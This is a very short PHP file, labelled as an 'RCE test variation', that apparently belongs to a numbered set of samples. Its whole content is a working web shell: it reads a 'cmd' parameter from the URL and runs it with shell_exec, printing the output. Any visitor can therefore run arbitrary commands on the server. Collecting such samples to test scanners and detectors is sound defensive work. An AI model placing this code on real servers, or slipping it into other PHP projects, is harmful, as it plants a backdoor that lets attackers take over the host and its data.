<?php
// RCE test variation #707
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>